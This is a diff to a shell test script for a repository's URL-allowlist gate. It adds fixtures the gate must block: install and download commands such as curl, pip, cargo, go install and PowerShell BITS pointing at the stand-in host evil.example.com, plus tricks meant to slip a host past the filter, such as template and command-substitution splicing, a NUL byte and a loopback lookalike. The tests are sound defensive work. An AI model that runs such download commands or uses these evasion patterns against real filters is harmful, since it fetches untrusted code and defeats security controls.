@@ -24,7 +24,8 @@ check() {
   local name="$1" expect="$2" rel="$3" content="$4"
   local abs="$repo_root/$rel"
   mkdir -p "$(dirname "$abs")"
-  printf '%s\n' "$content" > "$abs"
+  # %b so that fixtures can contain \n and exercise multi-line cases.
+  printf '%b\n' "$content" > "$abs"
   local out rc
   out="$("$gate" "$rel" 2>&1)"; rc=$?
   rm -f "$abs"
@@ -82,6 +83,24 @@ else
   pass=$((pass + 1)); printf 'ok   comments and the test module cannot widen the allowlist\n'
 fi
 
+
+nul_rel="$sample_dir/nul.rs"
+mkdir -p "$repo_root/$sample_dir"
+printf 'const U: &str = "https://evil.example.com/x";\n\0' > "$repo_root/$nul_rel"
+if "$gate" "$nul_rel" >/dev/null 2>&1; then
+  fail=$((fail + 1)); printf 'FAIL a NUL byte must not hide a URL from the gate\n'
+else
+  pass=$((pass + 1)); printf 'ok   a NUL byte does not hide a URL from the gate\n'
+fi
+rm -f "$repo_root/$nul_rel"; rmdir "$repo_root/$sample_dir" 2>/dev/null || true
+
+# The documented exception list must be the one the gate applies.
+if "$gate" --print-exceptions | grep -q 'release\.yml'; then
+  pass=$((pass + 1)); printf 'ok   --print-exceptions reports the skip list\n'
+else
+  fail=$((fail + 1)); printf 'FAIL --print-exceptions must report the skip list\n'
+fi
+
 # --- must block -------------------------------------------------------------
 
 check "unknown host in rust" block "$sample_dir/a.rs" \
@@ -120,6 +139,33 @@ check "uppercase scheme" block "$sample_dir/o.rs" \
 check "handlebars template with an unknown host" block "$sample_dir/p.hbs" \
   '<a href="https://evil.example.com">x</a>'
 
+check "markdown cargo install from an unknown host" block "$sample_dir/r.md" \
+  'Install with `cargo install --git https://evil.example.com/erpc`'
+
+check "markdown pip install from an unknown host" block "$sample_dir/s.md" \
+  'Run: pip install https://evil.example.com/p.whl'
+
+check "markdown go install from an unknown host" block "$sample_dir/t.md" \
+  'go install https://evil.example.com/cmd@latest'
+
+check "powershell download in prose" block "$sample_dir/u.md" \
+  'Start-BitsTransfer -Source https://evil.example.com/x.exe'
+
+check "empty template appended to a literal host" block "$sample_dir/v.ts" \
+  'fetch(`https://evil.example.com${""}/x`)'
+
+check "workflow expression appended to a literal host" block "$sample_dir/w.yml" \
+  '      - run: curl https://evil.example.com${{ env.NOTHING }}/x'
+
+check "command substitution appended to a literal host" block "$sample_dir/x.sh" \
+  'curl "https://evil.example.com$(true)/x"'
+
+check "loopback lookalike is not treated as loopback" block "$sample_dir/y.md" \
+  'Download http://localhost.evil.com/x'
+
+check "fenced code block in prose is held to the allowlist" block "$sample_dir/z.md" \
+  '```bash\ncurl -sSfL https://evil.example.com/x\n```'
+
 # --- must allow -------------------------------------------------------------
 
 check "allowlisted service host" allow "$sample_dir/g.rs" \
@@ -143,6 +189,10 @@ check "documentation link over https" allow "$sample_dir/l.md" \
 
 check "markdown install command to an allowlisted host" allow "$sample_dir/q.md" \
   'Run `curl -sSfL https://install.erpc.global | bash` to install.'
+
+
+check "fenced code block with an allowlisted host" allow "$sample_dir/aa.md" \
+  '```bash\ngit clone https://github.com/elsoul/erpc-cli\n```'
 
 printf '\n%s passed, %s failed\n' "$pass" "$fail"
 [ "$fail" -eq 0 ]
